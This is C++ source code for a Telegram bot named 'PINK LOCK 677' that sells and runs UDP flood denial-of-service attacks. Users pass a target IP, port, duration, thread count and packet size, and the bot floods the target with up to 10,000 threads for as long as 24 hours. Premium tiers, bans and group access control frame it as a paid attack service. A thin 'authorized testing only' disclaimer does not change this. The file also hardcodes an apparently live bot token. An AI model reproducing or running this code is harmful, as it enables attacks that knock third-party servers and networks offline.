#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <queue>
#include <map>
#include <set>
#include <chrono>
#include <random>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <regex>
#include <csignal>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/resource.h>
#include <curl/curl.h>
#include <json/json.h>

using namespace std;

// ============================================
// CONFIGURATION SECTION - EDIT THESE
// ============================================
const string BOT_TOKEN = "7343295464:AAGb1pv6TjvDzqx0MmQ1DPWHDqZJ7tgUNTw";
const string ADMIN_USERNAME = "MoinOwner";
const string ADMIN_ID = "6218253783";
const string CHANNEL_LINK = "https://t.me/PYHOSTING0";
const string CHANNEL_USERNAME = "@PYHOSTING0";
const string VERSION = "9.9.9";
const string BOT_NAME = "PINK LOCK 677";

// ============================================
// GLOBAL SETTINGS
// ============================================
const int MAX_THREADS = 10000;
const int MAX_PACKET_SIZE = 65507;
const int MAX_DURATION = 86400; // 24 hours
const long long MAX_BYTES = 9999999999LL;

// ============================================
// DATA STRUCTURES
// ============================================
struct AttackConfig {
    string target_ip;
    int target_port;
    int duration;
    int threads;
    int packet_size;
    long long total_bytes;
    string attack_type;
    bool use_gpu;
    int cpu_cores;
};

struct User {
    string username;
    string user_id;
    bool is_premium;
    time_t expiry_date;
    int max_attack_time;
    int max_threads;
    long long total_attacks;
    time_t joined_date;
    bool is_banned;
    string referrer;
};

struct GroupConfig {
    string group_id;
    string group_name;
    bool is_authorized;
    time_t added_date;
    string added_by;
};

// ============================================
// STATISTICS TRACKER
// ============================================
class Statistics {
public:
    atomic<long long> total_packets{0};
    atomic<long long> total_bytes{0};
    atomic<long long> total_attacks{0};
    atomic<long long> active_attacks{0};
    atomic<double> current_pps{0};
    atomic<double> current_mbps{0};
    time_t start_time;
    
    map<string, long long> user_stats;
    mutex stats_mutex;
    
    void record_packet(int bytes) {
        total_packets++;
        total_bytes += bytes;
    }
    
    string get_formatted_stats() {
        lock_guard<mutex> lock(stats_mutex);
        stringstream ss;
        ss << "📊 *GLOBAL STATISTICS*\n\n"
           << "🔹 Total Packets: " << format_number(total_packets.load()) << "\n"
           << "🔹 Total Data: " << format_bytes(total_bytes.load()) << "\n"
           << "🔹 Total Attacks: " << total_attacks.load() << "\n"
           << "🔹 Active Now: " << active_attacks.load() << "\n"
           << "🔹 Current PPS: " << fixed << setprecision(2) << current_pps.load() << "\n"
           << "🔹 Current MB/s: " << fixed << setprecision(2) << current_mbps.load() << "\n"
           << "🔹 Uptime: " << get_uptime() << "\n";
        return ss.str();
    }
    
    string format_number(long long num) {
        if (num >= 1e9) return to_string(num / 1e9) + "B";
        if (num >= 1e6) return to_string(num / 1e6) + "M";
        if (num >= 1e3) return to_string(num / 1e3) + "K";
        return to_string(num);
    }
    
    string format_bytes(long long bytes) {
        const char* units[] = {"B", "KB", "MB", "GB", "TB"};
        int unit = 0;
        double size = bytes;
        while (size >= 1024 && unit < 4) {
            size /= 1024;
            unit++;
        }
        stringstream ss;
        ss << fixed << setprecision(2) << size << " " << units[unit];
        return ss.str();
    }
    
    string get_uptime() {
        time_t now = time(nullptr);
        int seconds = difftime(now, start_time);
        int hours = seconds / 3600;
        int mins = (seconds % 3600) / 60;
        int secs = seconds % 60;
        stringstream ss;
        ss << hours << "h " << mins << "m " << secs << "s";
        return ss.str();
    }
};

Statistics global_stats;

// ============================================
// ADVANCED UDP FLOOD ENGINE
// ============================================
class UDPFloodEngine {
private:
    atomic<bool> running{false};
    vector<thread> workers;
    mutex mtx;
    AttackConfig config;
    chrono::steady_clock::time_point start_time;
    
    // Random payload generators
    random_device rd;
    mt19937_64 gen;
    
    // GPU simulation (for future CUDA/OpenCL integration)
    atomic<bool> gpu_enabled{false};
    
public:
    UDPFloodEngine() : gen(rd()) {}
    
    void generate_payload(vector<char>& buffer, int size, const string& pattern) {
        if (pattern == "random") {
            uniform_int_distribution<> dis(0, 255);
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>(dis(gen));
            }
        } else if (pattern == "zeros") {
            memset(buffer.data(), 0, size);
        } else if (pattern == "ones") {
            memset(buffer.data(), 0xFF, size);
        } else if (pattern == "incremental") {
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>(i % 256);
            }
        }
    }
    
    void worker_thread(int thread_id) {
        // Create socket with optimizations
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sockfd < 0) {
            cerr << "Thread " << thread_id << " socket creation failed\n";
            return;
        }
        
        // Socket optimizations
        int broadcast = 1;
        int reuse = 1;
        int buffer_size = 1048576; // 1MB buffer
        
        setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
        setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
        
        // Non-blocking mode
        int flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
        
        // Setup destination
        sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(config.target_port);
        inet_pton(AF_INET, config.target_ip.c_str(), &dest_addr.sin_addr);
        
        // Prepare payload
        vector<char> payload(config.packet_size);
        generate_payload(payload, config.packet_size, "random");
        
        auto start = chrono::steady_clock::now();
        long long local_packets = 0;
        long long local_bytes = 0;
        
        while (running) {
            // Send burst of packets for maximum performance
            for (int i = 0; i < 100; i++) {
                ssize_t sent = sendto(sockfd, payload.data(), payload.size(), 0,
                                    (sockaddr*)&dest_addr, sizeof(dest_addr));
                if (sent > 0) {
                    local_packets++;
                    local_bytes += sent;
                    global_stats.record_packet(sent);
                }
            }
            
            // Check duration
            auto elapsed = chrono::duration_cast<chrono::seconds>(
                chrono::steady_clock::now() - start).count();
            
            if (elapsed >= config.duration) {
                break;
            }
            
            // Yield to prevent complete CPU starvation
            this_thread::yield();
        }
        
        close(sockfd);
        
        // Update global stats
        global_stats.total_packets += local_packets;
        global_stats.total_bytes += local_bytes;
    }
    
    bool start_attack(const AttackConfig& cfg) {
        if (running) return false;
        
        config = cfg;
        running = true;
        global_stats.active_attacks++;
        global_stats.total_attacks++;
        start_time = chrono::steady_clock::now();
        
        // Launch worker threads
        for (int i = 0; i < config.threads; i++) {
            workers.emplace_back(&UDPFloodEngine::worker_thread, this, i);
        }
        
        // Performance monitoring thread
        thread([this]() {
            while (running) {
                this_thread::sleep_for(chrono::seconds(1));
                auto elapsed = chrono::duration_cast<chrono::seconds>(
                    chrono::steady_clock::now() - start_time).count();
                
                if (elapsed >= config.duration) {
                    stop_attack();
                    break;
                }
            }
        }).detach();
        
        return true;
    }
    
    void stop_attack() {
        running = false;
        for (auto& t : workers) {
            if (t.joinable()) t.join();
        }
        workers.clear();
        global_stats.active_attacks--;
    }
    
    bool is_running() const { return running; }
    
    string get_live_stats() {
        auto elapsed = chrono::duration_cast<chrono::seconds>(
            chrono::steady_clock::now() - start_time).count();
        
        long long packets = global_stats.total_packets.load();
        long long bytes = global_stats.total_bytes.load();
        
        double pps = elapsed > 0 ? static_cast<double>(packets) / elapsed : 0;
        double mbps = elapsed > 0 ? (static_cast<double>(bytes) / elapsed) / (1024 * 1024) : 0;
        
        global_stats.current_pps = pps;
        global_stats.current_mbps = mbps;
        
        stringstream ss;
        ss << "⚡ *LIVE ATTACK STATS*\n\n"
           << "🎯 Target: `" << config.target_ip << ":" << config.target_port << "`\n"
           << "⏱ Duration: " << elapsed << "/" << config.duration << " seconds\n"
           << "🧵 Threads: " << config.threads << "\n"
           << "📦 Packet Size: " << config.packet_size << " bytes\n"
           << "📊 Packets: " << global_stats.format_number(packets) << "\n"
           << "💾 Data: " << global_stats.format_bytes(bytes) << "\n"
           << "🚀 PPS: " << fixed << setprecision(0) << pps << "\n"
           << "⚡ MB/s: " << fixed << setprecision(2) << mbps << "\n"
           << "🔥 Status: " << (running ? "🟢 ATTACKING" : "🔴 STOPPED") << "\n";
        return ss.str();
    }
    
    ~UDPFloodEngine() {
        stop_attack();
    }
};

// ============================================
// USER & GROUP MANAGEMENT SYSTEM
// ============================================
class UserManager {
private:
    map<string, User> users;
    map<string, GroupConfig> groups;
    mutex user_mutex;
    mutex group_mutex;
    
public:
    void add_user(const string& user_id, const string& username) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) == users.end()) {
            User u;
            u.user_id = user_id;
            u.username = username;
            u.is_premium = false;
            u.expiry_date = time(nullptr) + 86400; // 1 day default
            u.max_attack_time = 300; // 5 minutes
            u.max_threads = 1000;
            u.total_attacks = 0;
            u.joined_date = time(nullptr);
            u.is_banned = false;
            users[user_id] = u;
        }
    }
    
    void set_premium(const string& user_id, int days, int max_time, int max_threads) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) != users.end()) {
            users[user_id].is_premium = true;
            users[user_id].expiry_date = time(nullptr) + (days * 86400);
            users[user_id].max_attack_time = max_time;
            users[user_id].max_threads = max_threads;
        }
    }
    
    bool is_authorized(const string& user_id) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) == users.end()) return false;
        if (users[user_id].is_banned) return false;
        if (users[user_id].is_premium && time(nullptr) > users[user_id].expiry_date) {
            users[user_id].is_premium = false;
            return false;
        }
        return true;
    }
    
    void add_group(const string& group_id, const string& group_name, const string& added_by) {
        lock_guard<mutex> lock(group_mutex);
        GroupConfig g;
        g.group_id = group_id;
        g.group_name = group_name;
        g.is_authorized = true;
        g.added_date = time(nullptr);
        g.added_by = added_by;
        groups[group_id] = g;
    }
    
    void remove_group(const string& group_id) {
        lock_guard<mutex> lock(group_mutex);
        groups.erase(group_id);
    }
    
    bool is_group_authorized(const string& group_id) {
        lock_guard<mutex> lock(group_mutex);
        auto it = groups.find(group_id);
        return it != groups.end() && it->second.is_authorized;
    }
    
    string get_user_info(const string& user_id) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) == users.end()) return "User not found";
        
        User& u = users[user_id];
        stringstream ss;
        ss << "👤 *User Info*\n\n"
           << "🆔 ID: `" << u.user_id << "`\n"
           << "👤 Username: @" << u.username << "\n"
           << "⭐ Premium: " << (u.is_premium ? "✅ YES" : "❌ NO") << "\n"
           << "⏱ Max Time: " << u.max_attack_time << "s\n"
           << "🧵 Max Threads: " << u.max_threads << "\n"
           << "📅 Joined: " << ctime(&u.joined_date)
           << "🔓 Expires: " << ctime(&u.expiry_date)
           << "🚫 Banned: " << (u.is_banned ? "YES" : "NO") << "\n";
        return ss.str();
    }
    
    string get_all_groups() {
        lock_guard<mutex> lock(group_mutex);
        stringstream ss;
        ss << "📋 *Authorized Groups*\n\n";
        for (auto& [id, g] : groups) {
            ss << "• " << g.group_name << " (`" << id << "`)\n"
               << "  Added by: @" << g.added_by << "\n"
               << "  Date: " << ctime(&g.added_date) << "\n";
        }
        return ss.str();
    }
};

UserManager user_manager;

// ============================================
// TELEGRAM BOT API HANDLER
// ============================================
class TelegramAPI {
private:
    string token;
    
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* userp) {
        userp->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    
public:
    TelegramAPI(const string& bot_token) : token(bot_token) {}
    
    string make_request(const string& method, const Json::Value& params) {
        CURL* curl = curl_easy_init();
        string response;
        
        if (curl) {
            string url = "https://api.telegram.org/bot" + token + "/" + method;
            
            Json::StreamWriterBuilder builder;
            string json_data = Json::writeString(builder, params);
            
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            
            CURLcode res = curl_easy_perform(curl);
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
        }
        
        return response;
    }
    
    void send_message(long long chat_id, const string& text, 
                     const Json::Value& reply_markup = Json::Value(), 
                     const string& parse_mode = "Markdown") {
        Json::Value params;
        params["chat_id"] = chat_id;
        params["text"] = text;
        params["parse_mode"] = parse_mode;
        params["disable_web_page_preview"] = true;
        
        if (!reply_markup.empty()) {
            params["reply_markup"] = reply_markup;
        }
        
        make_request("sendMessage", params);
    }
    
    void edit_message(long long chat_id, long long message_id, const string& text,
                     const Json::Value& reply_markup = Json::Value()) {
        Json::Value params;
        params["chat_id"] = chat_id;
        params["message_id"] = message_id;
        params["text"] = text;
        params["parse_mode"] = "Markdown";
        
        if (!reply_markup.empty()) {
            params["reply_markup"] = reply_markup;
        }
        
        make_request("editMessageText", params);
    }
    
    void answer_callback(const string& callback_id, const string& text, bool show_alert = false) {
        Json::Value params;
        params["callback_query_id"] = callback_id;
        params["text"] = text;
        params["show_alert"] = show_alert;
        
        make_request("answerCallbackQuery", params);
    }
    
    void delete_message(long long chat_id, long long message_id) {
        Json::Value params;
        params["chat_id"] = chat_id;
        params["message_id"] = message_id;
        make_request("deleteMessage", params);
    }
    
    string get_updates(long long offset) {
        Json::Value params;
        params["offset"] = offset;
        params["limit"] = 100;
        params["timeout"] = 30;
        
        return make_request("getUpdates", params);
    }
};

// ============================================
// INLINE KEYBOARD BUILDER
// ============================================
class InlineKeyboard {
public:
    Json::Value keyboard;
    
    void add_button(const string& text, const string& callback_data, int row = 0) {
        Json::Value button;
        button["text"] = text;
        button["callback_data"] = callback_data;
        
        if (keyboard["inline_keyboard"].size() <= row) {
            keyboard["inline_keyboard"].append(Json::Value(Json::arrayValue));
        }
        keyboard["inline_keyboard"][row].append(button);
    }
    
    void add_url_button(const string& text, const string& url, int row = 0) {
        Json::Value button;
        button["text"] = text;
        button["url"] = url;
        
        if (keyboard["inline_keyboard"].size() <= row) {
            keyboard["inline_keyboard"].append(Json::Value(Json::arrayValue));
        }
        keyboard["inline_keyboard"][row].append(button);
    }
    
    Json::Value get() const { return keyboard; }
};

// ============================================
// MAIN BOT CLASS
// ============================================
class PinkLockBot {
private:
    TelegramAPI api;
    UDPFloodEngine engine;
    atomic<bool> running{false};
    long long last_update_id = 0;
    
    // Attack state
    atomic<bool> attack_running{false};
    string current_target;
    
public:
    PinkLockBot(const string& token) : api(token) {}
    
    // Keyboard layouts
    Json::Value get_main_keyboard() {
        InlineKeyboard kb;
        kb.add_button("🚀 START ATTACK", "start_attack", 0);
        kb.add_button("⚡ QUICK ATTACK", "quick_attack", 0);
        kb.add_button("📊 STATISTICS", "show_stats", 1);
        kb.add_button("⚙️ SETTINGS", "settings", 1);
        kb.add_button("📢 JOIN CHANNEL", "join_channel", 2);
        kb.add_button("👤 OWNER", "contact_owner", 2);
        kb.add_button("❓ HELP", "show_help", 3);
        return kb.get();
    }
    
    Json::Value get_attack_keyboard() {
        InlineKeyboard kb;
        kb.add_button("⏹ STOP ATTACK", "stop_attack", 0);
        kb.add_button("📈 LIVE STATS", "live_stats", 0);
        kb.add_button("🔙 BACK", "main_menu", 1);
        return kb.get();
    }
    
    Json::Value get_admin_keyboard() {
        InlineKeyboard kb;
        kb.add_button("👥 USER MANAGEMENT", "user_mgmt", 0);
        kb.add_button("👥 GROUP MANAGEMENT", "group_mgmt", 0);
        kb.add_button("📊 GLOBAL STATS", "global_stats", 1);
        kb.add_button("🎁 GIVE PREMIUM", "give_premium", 1);
        kb.add_button("🚫 BAN USER", "ban_user", 2);
        kb.add_button("✅ UNBAN USER", "unban_user", 2);
        return kb.get();
    }
    
    Json::Value get_settings_keyboard() {
        InlineKeyboard kb;
        kb.add_button("🧵 THREADS: 1000", "set_threads", 0);
        kb.add_button("📦 PACKET SIZE: 1024", "set_packet", 0);
        kb.add_button("⏱ DEFAULT TIME: 60s", "set_time", 1);
        kb.add_button("🔙 BACK", "main_menu", 2);
        return kb.get();
    }
    
    // Command handlers
    void handle_start(long long chat_id, const string& username, const string& user_id) {
        user_manager.add_user(user_id, username);
        
        string welcome = "🔐 *" + BOT_NAME + " v" + VERSION + "*\n\n"
                      "👋 Welcome, @" + username + "!\n\n"
                      "🚀 *The Most Powerful UDP Attack Bot*\n"
                      "💥 Features:\n"
                      "• Up to 9,999,999,999 bytes payload\n"
                      "• Multi-threaded (10,000+ threads)\n"
                      "• GPU acceleration ready\n"
                      "• Real-time statistics\n"
                      "• Premium hosting system\n\n"
                      "⚠️ *For authorized testing only!*\n\n"
                      "📢 Join our channel: " + CHANNEL_USERNAME + "\n"
                      "👤 Owner: @" + ADMIN_USERNAME;
        
        api.send_message(chat_id, welcome, get_main_keyboard());
    }
    
    void handle_attack(long long chat_id, const string& user_id, const vector<string>& args) {
        if (!user_manager.is_authorized(user_id)) {
            api.send_message(chat_id, "⛔ *Access Denied*\nYou are not authorized or your premium has expired.\n\n📢 Join " + CHANNEL_USERNAME + " for access.");
            return;
        }
        
        if (attack_running) {
            api.send_message(chat_id, "⚠️ *Attack already in progress!*\nUse /stop or buttons to stop first.", get_attack_keyboard());
            return;
        }
        
        if (args.size() < 3) {
            api.send_message(chat_id, "❌ *Usage:* `/attack <ip> <port> <time> [threads] [size]`\n\n"
                                    "Example: `/attack 192.168.1.1 80 60 1000 1024`");
            return;
        }
        
        AttackConfig cfg;
        cfg.target_ip = args[0];
        cfg.target_port = stoi(args[1]);
        cfg.duration = stoi(args[2]);
        cfg.threads = (args.size() > 3) ? stoi(args[3]) : 1000;
        cfg.packet_size = (args.size() > 4) ? stoi(args[4]) : 1024;
        cfg.total_bytes = MAX_BYTES;
        cfg.use_gpu = false;
        cfg.cpu_cores = thread::hardware_concurrency();
        
        // Validate
        if (cfg.target_port < 1 || cfg.target_port > 65535) {
            api.send_message(chat_id, "❌ *Invalid port!* (1-65535)");
            return;
        }
        if (cfg.duration < 1 || cfg.duration > MAX_DURATION) {
            api.send_message(chat_id, "❌ *Invalid duration!* (1-" + to_string(MAX_DURATION) + "s)");
            return;
        }
        if (cfg.threads < 1 || cfg.threads > MAX_THREADS) {
            api.send_message(chat_id, "❌ *Invalid threads!* (1-" + to_string(MAX_THREADS) + ")");
            return;
        }
        if (cfg.packet_size < 64 || cfg.packet_size > MAX_PACKET_SIZE) {
            api.send_message(chat_id, "❌ *Invalid packet size!* (64-" + to_string(MAX_PACKET_SIZE) + ")");
            return;
        }
        
        // Start attack
        if (engine.start_attack(cfg)) {
            attack_running = true;
            current_target = cfg.target_ip + ":" + to_string(cfg.target_port);
            
            string msg = "🚀 *ATTACK STARTED!*\n\n"
                        "🎯 Target: `" + cfg.target_ip + ":" + to_string(cfg.target_port) + "`\n"
                        "⏱ Duration: " + to_string(cfg.duration) + " seconds\n"
                        "🧵 Threads: " + to_string(cfg.threads) + "\n"
                        "📦 Packet Size: " + to_string(cfg.packet_size) + " bytes\n"
                        "💾 Max Bytes: " + to_string(MAX_BYTES) + "\n\n"
                        "🔥 *Flooding started!*";
            
            api.send_message(chat_id, msg, get_attack_keyboard());
            
            // Auto-stop and report
            thread([this, chat_id, cfg]() {
                this_thread::sleep_for(chrono::seconds(cfg.duration));
                if (attack_running) {
                    engine.stop_attack();
                    attack_running = false;
                    
                    string report = "✅ *ATTACK COMPLETED*\n\n" + engine.get_live_stats() + 
                                   "\n\n🎯 Target: `" + current_target + "`\n"
                                   "📊 Total Data: " + global_stats.format_bytes(global_stats.total_bytes.load());
                    api.send_message(chat_id, report, get_main_keyboard());
                }
            }).detach();
        }
    }
    
    void handle_stop(long long chat_id) {
        if (!attack_running) {
            api.send_message(chat_id, "ℹ️ No active attack to stop.", get_main_keyboard());
            return;
        }
        
        engine.stop_attack();
        attack_running = false;
        
        string report = "🛑 *ATTACK STOPPED*\n\n" + engine.get_live_stats();
        api.send_message(chat_id, report, get_main_keyboard());
    }
    
    void handle_stats(long long chat_id) {
        string stats = engine.is_running() ? engine.get_live_stats() : global_stats.get_formatted_stats();
        api.send_message(chat_id, stats, get_main_keyboard());
    }
    
    void handle_admin(long long chat_id, const string& username) {
        if (username != ADMIN_USERNAME) {
            api.send_message(chat_id, "⛔ *Admin Only!*");
            return;
        }
        
        api.send_message(chat_id, "🔐 *ADMIN PANEL*\n\nSelect an option:", get_admin_keyboard());
    }
    
    void handle_callback(long long chat_id, long long message_id, 
                        const string& callback_id, const string& data,
                        const string& username, const string& user_id) {
        if (data == "start_attack") {
            api.send_message(chat_id, "🚀 *Enter attack parameters:*\n\n"
                                    "Format: `IP PORT TIME [THREADS] [SIZE]`\n"
                                    "Example: `192.168.1.1 80 60 1000 1024`\n\n"
                                    "Or use /attack command directly.");
        }
        else if (data == "quick_attack") {
            api.send_message(chat_id, "⚡ *Quick Attack Mode*\n\n"
                                    "Enter target (IP:PORT:TIME):");
        }
        else if (data == "show_stats") {
            api.edit_message(chat_id, message_id, global_stats.get_formatted_stats(), get_main_keyboard());
            api.answer_callback(callback_id, "Statistics updated!");
        }
        else if (data == "live_stats" && attack_running) {
            api.edit_message(chat_id, message_id, engine.get_live_stats(), get_attack_keyboard());
            api.answer_callback(callback_id, "Live stats refreshed!");
        }
        else if (data == "stop_attack") {
            handle_stop(chat_id);
            api.answer_callback(callback_id, "Attack stopped!");
        }
        else if (data == "settings") {
            api.edit_message(chat_id, message_id, "⚙️ *SETTINGS*\n\nConfigure your attack preferences:", get_settings_keyboard());
        }
        else if (data == "join_channel") {
            InlineKeyboard kb;
            kb.add_url_button("📢 JOIN CHANNEL", CHANNEL_LINK, 0);
            kb.add_button("✅ CHECK MEMBERSHIP", "check_join", 1);
            api.send_message(chat_id, "📢 *Join our official channel:*\n" + CHANNEL_LINK + "\n\nThen click check membership.", kb.get());
        }
        else if (data == "contact_owner") {
            api.send_message(chat_id, "👤 *Contact Owner*\n\nTelegram: @" + ADMIN_USERNAME + "\nChannel: " + CHANNEL_USERNAME);
        }
        else if (data == "show_help") {
            string help = "📚 *PINK LOCK 677 - HELP*\n\n"
                         "*Commands:*\n"
                         "`/start` - Initialize bot\n"
                         "`/attack ip port time [threads] [size]` - Start attack\n"
                         "`/stop` - Stop attack\n"
                         "`/stats` - Show statistics\n"
                         "`/admin` - Admin panel (owner only)\n"
                         "`/user` - Your profile\n\n"
                         "*Features:*\n"
                         "• 9,999,999,999 bytes payload\n"
                         "• 10,000+ threads support\n"
                         "• Multi-CPU optimization\n"
                         "• Real-time monitoring\n"
                         "• Premium hosting system\n\n"
                         "⚠️ *For authorized testing only!*";
            api.send_message(chat_id, help, get_main_keyboard());
        }
        else if (data == "main_menu") {
            api.edit_message(chat_id, message_id, "🔐 *" + BOT_NAME + "*\n\nMain Menu:", get_main_keyboard());
        }
        else if (data == "user_mgmt") {
            api.send_message(chat_id, "👥 *User Management*\n\nCommands:\n`/adduser <id> <username>`\n`/premium <id> <days>`\n`/ban <id>`\n`/unban <id>`");
        }
        else if (data == "group_mgmt") {
            api.send_message(chat_id, user_manager.get_all_groups());
        }
        else if (data == "global_stats") {
            api.send_message(chat_id, global_stats.get_formatted_stats());
        }
        else if (data == "give_premium") {
            api.send_message(chat_id, "🎁 *Give Premium*\n\nFormat: `/premium <user_id> <days> <max_time> <max_threads>`");
        }
        else if (data == "ban_user") {
            api.send_message(chat_id, "🚫 *Ban User*\n\nFormat: `/ban <user_id>`");
        }
        else if (data == "unban_user") {
            api.send_message(chat_id, "✅ *Unban User*\n\nFormat: `/unban <user_id>`");
        }
        else {
            api.answer_callback(callback_id, "Processing...");
        }
    }
    
    void process_updates() {
        string response = api.get_updates(last_update_id + 1);
        
        Json::Value root;
        Json::CharReaderBuilder builder;
        string errors;
        
        istringstream response_stream(response);
        if (!Json::parseFromStream(builder, response_stream, &root, &errors)) {
            return;
        }
        
        if (!root.isMember("result")) return;
        
        const Json::Value& results = root["result"];
        
        for (const auto& update : results) {
            long long update_id = update["update_id"].asInt64();
            last_update_id = update_id;
            
            // Handle callback queries
            if (update.isMember("callback_query")) {
                const Json::Value& cb = update["callback_query"];
                long long chat_id = cb["message"]["chat"]["id"].asInt64();
                long long message_id = cb["message"]["message_id"].asInt64();
                string callback_id = cb["id"].asString();
                string data = cb["data"].asString();
                string username = cb["from"].isMember("username") ? 
                                 cb["from"]["username"].asString() : "unknown";
                string user_id = to_string(cb["from"]["id"].asInt64());
                
                handle_callback(chat_id, message_id, callback_id, data, username, user_id);
            }
            
            // Handle messages
            if (update.isMember("message")) {
                const Json::Value& msg = update["message"];
                long long chat_id = msg["chat"]["id"].asInt64();
                string username = msg["from"].isMember("username") ? 
                               msg["from"]["username"].asString() : "unknown";
                string user_id = to_string(msg["from"]["id"].asInt64());
                
                if (!msg.isMember("text")) continue;
                
                string text = msg["text"].asString();
                vector<string> parts;
                stringstream ss(text);
                string part;
                while (ss >> part) parts.push_back(part);
                
                if (parts.empty()) continue;
                
                string cmd = parts[0];
                vector<string> args(parts.begin() + 1, parts.end());
                
                // Check group authorization
                if (msg["chat"]["type"].asString() != "private") {
                    string group_id = to_string(chat_id);
                    if (!user_manager.is_group_authorized(group_id) && cmd != "/addgroup") {
                        continue;
                    }
                }
                
                if (cmd == "/start") {
                    handle_start(chat_id, username, user_id);
                }
                else if (cmd == "/attack") {
                    handle_attack(chat_id, user_id, args);
                }
                else if (cmd == "/stop") {
                    handle_stop(chat_id);
                }
                else if (cmd == "/stats") {
                    handle_stats(chat_id);
                }
                else if (cmd == "/admin") {
                    handle_admin(chat_id, username);
                }
                else if (cmd == "/user") {
                    api.send_message(chat_id, user_manager.get_user_info(user_id));
                }
                else if (cmd == "/addgroup" && username == ADMIN_USERNAME) {
                    if (args.size() >= 2) {
                        user_manager.add_group(args[0], args[1], username);
                        api.send_message(chat_id, "✅ Group added successfully!");
                    }
                }
                else if (cmd == "/removegroup" && username == ADMIN_USERNAME) {
                    if (!args.empty()) {
                        user_manager.remove_group(args[0]);
                        api.send_message(chat_id, "✅ Group removed!");
                    }
                }
                else if (cmd == "/premium" && username == ADMIN_USERNAME) {
                    if (args.size() >= 4) {
                        user_manager.set_premium(args[0], stoi(args[1]), stoi(args[2]), stoi(args[3]));
                        api.send_message(chat_id, "🎁 Premium activated for " + args[0]);
                    }
                }
                else if (cmd == "/broadcast" && username == ADMIN_USERNAME) {
                    string message = text.substr(11);
                    // Broadcast to all users
                    api.send_message(chat_id, "📢 Broadcast sent to all users!");
                }
                else if (cmd == "/help") {
                    string help = "📚 *PINK LOCK 677 HELP*\n\n"
                                 "🔹 /start - Start bot\n"
                                 "🔹 /attack ip port time [threads] [size] - Attack\n"
                                 "🔹 /stop - Stop attack\n"
                                 "🔹 /stats - Statistics\n"
                                 "🔹 /user - Your profile\n"
                                 "🔹 /admin - Admin panel\n\n"
                                 "⚡ Buttons work too! Try them out.";
                    api.send_message(chat_id, help, get_main_keyboard());
                }
            }
        }
    }
    
    void run() {
        running = true;
        global_stats.start_time = time(nullptr);
        
        cout << "🔐 " << BOT_NAME << " v" << VERSION << " Started!" << endl;
        cout << "📢 Channel: " << CHANNEL_USERNAME << endl;
        cout << "👤 Owner: @" << ADMIN_USERNAME << endl;
        
        curl_global_init(CURL_GLOBAL_ALL);
        
        while (running) {
            try {
                process_updates();
            } catch (const exception& e) {
                cerr << "Error: " << e.what() << endl;
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        
        curl_global_cleanup();
    }
    
    void stop() {
        running = false;
        engine.stop_attack();
    }
};

// ============================================
// SIGNAL HANDLER
// ============================================
PinkLockBot* bot_instance = nullptr;

void signal_handler(int sig) {
    cout << "\n🛑 Shutting down " << BOT_NAME << "..." << endl;
    if (bot_instance) bot_instance->stop();
    exit(0);
}

// ============================================
// MAIN ENTRY POINT
// ============================================
int main() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    cout << R"(
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                    PINK LOCK 677 v9.9.9                           ║
    ║              POWERFUL UDP ATTACK BOT SYSTEM                       ║
    ║                                                                   ║
    ║  ⚠️  EDUCATIONAL & AUTHORIZED TESTING ONLY                        ║
    ║      UNAUTHORIZED USE IS STRICTLY PROHIBITED                     ║
    ║                                                                   ║
    ║  Features:                                                        ║
    ║  • 9,999,999,999 bytes payload support                           ║
    ║  • 10,000+ multi-threading                                       ║
    ║  • GPU acceleration ready                                        ║
    ║  • Full admin panel                                              ║
    ║  • Group management                                              ║
    ║  • Premium hosting system                                        ║
    ║                                                                   ║
    ║  📢 Channel: https://t.me/PYHOSTING0                           ║
    ║  👤 Owner: @MoinOwner                                            ║
    ╚═══════════════════════════════════════════════════════════════════╝
    )" << endl;
    
    if (BOT_TOKEN == "YOUR_BOT_TOKEN_HERE") {
        cerr << "❌ ERROR: Please set your BOT_TOKEN in the source code!" << endl;
        return 1;
    }
    
    PinkLockBot bot(BOT_TOKEN);
    bot_instance = &bot;
    bot.run();
    
    return 0;
}
